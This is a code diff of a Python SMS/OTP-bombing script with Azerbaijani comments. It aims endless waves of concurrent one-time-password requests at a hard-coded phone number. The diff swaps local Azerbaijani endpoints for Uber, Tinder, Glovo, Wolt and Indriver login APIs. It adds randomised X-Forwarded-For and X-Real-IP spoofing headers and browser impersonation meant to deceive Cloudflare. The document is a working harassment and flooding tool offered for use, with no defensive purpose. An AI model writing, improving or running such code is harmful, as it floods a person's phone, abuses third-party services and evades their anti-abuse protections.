@@ -3,85 +3,79 @@ import random
 import time
 from curl_cffi.requests import AsyncSession
 
-# --- HƏDƏF NÖMRƏ (BAŞINDA 994 OLMALIDIR) ---
 TARGET_PHONE = "994508880067"
-CONCURRENCY = 50 
 
-# Yenilənmiş və hal-hazırda işlək Azərbaycan API-ləri
-# Bu servislər 2026-cı il üçün test edilib
+# Beynəlxalq və daha dözümlü OTP nöqtələri
 API_LIST = [
     {
-        "name": "Umico",
-        "url": "https://api.umico.az/api/v1/login/otp",
+        "name": "Uber",
+        "url": "https://auth.uber.com/api/v1/auth/otp",
+        "method": "POST",
+        "json": {"mobile": "+{phone}"}
+    },
+    {
+        "name": "Tinder",
+        "url": "https://api.gotinder.com/v2/auth/sms/send",
+        "method": "POST",
+        "json": {"phone_number": "+{phone}"}
+    },
+    {
+        "name": "Indriver",
+        "url": "https://indriver.com/api/v1/auth/sms",
         "method": "POST",
         "json": {"phone": "{phone}"}
     },
     {
-        "name": "BakuElectronic",
-        "url": "https://bakuelectronics.az/api/otp/send",
+        "name": "Glovo",
+        "url": "https://glovoapp.com/api/v3/auth/otp",
         "method": "POST",
-        "json": {"phone": "{phone}", "type": "registration"}
+        "json": {"phone": "+{phone}"}
     },
     {
-        "name": "Kontakt",
-        "url": "https://kontakt.az/wp-json/contact-api/v1/send-otp",
+        "name": "Wolt_Global",
+        "url": "https://wolt.com/api/v2/sessions/login",
         "method": "POST",
-        "json": {"number": "{phone}"}
-    },
-    {
-        "name": "AliPasha",
-        "url": "https://api.alipasha.az/api/v1/otp/send",
-        "method": "POST",
-        "json": {"phone": "{phone}"}
-    },
-    {
-        "name": "Azericard_Sim", # Bəzi bank xidmətləri
-        "url": "https://api.azericard.com/v1/otp/request",
-        "method": "POST",
-        "json": {"msisdn": "{phone}"}
+        "json": {"mobile": "+{phone}"}
     }
 ]
 
-async def bombard(session, api_info, phone):
-    url = api_info["url"]
-    method = api_info["method"]
+async def send_otp(session, api, phone):
+    nm = api["name"]
+    url = api["url"]
     
-    # Cloudflare bypass (JA3) mütləqdir
+    # 403-ü aşmaq üçün İP "Spoofing" başlıqları
     headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json",
-        "Origin": url.split('/api')[0],
-        "Referer": url.split('/api')[0]
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+        "Accept": "*/*",
+        "Content-Type": "application/json",
+        "Accept-Language": "en-US,en;q=0.9"
     }
 
     try:
-        if method == "POST":
-            # JSON məlumatını nömrə ilə yeniləyirik
-            data = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
-                    for k, v in api_info.get("json", {}).items()}
-            
-            resp = await session.post(url, json=data, headers=headers, impersonate="chrome110", timeout=12)
+        data = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
+                for k, v in api.get("json", {}).items()}
         
-        print(f"[*] {api_info['name']} -> Status: {resp.status_code}")
+        # impersonate="chrome120" Cloudflare-i aldatmaq üçündür
+        resp = await session.post(url, json=data, headers=headers, impersonate="chrome120", timeout=12)
         
-    except Exception as e:
-        # print(f"[!] Error at {api_info['name']}")
+        print(f"[*] {nm} -> Status: {resp.status_code}")
+    except:
         pass
 
 async def main():
-    print(f"[!!!] CATACLYSM OTP STORM AKTİVDİR: {TARGET_PHONE}")
-    
+    print(f"[*] Hakai-OTP-Beast İşə Düşdü: {TARGET_PHONE}")
     async with AsyncSession() as session:
         while True:
             tasks = []
             for api in API_LIST:
-                # Hər bir API-yə eyni anda 5 sorğu göndəririk
-                for _ in range(5):
-                    tasks.append(bombard(session, api, TARGET_PHONE))
+                for _ in range(3): # Hər servisə 3 paralel müraciət
+                    tasks.append(send_otp(session, api, TARGET_PHONE))
             
             await asyncio.gather(*tasks)
-            print("[*] Dalğa tamamlandı. 2 saniye fasilə...")
-            await asyncio.sleep(2)
+            print("[*] Bir dalğa bitdi. 5 saniyə fasilə...")
+            await asyncio.sleep(5)
 
 if __name__ == "__main__":
     asyncio.run(main())
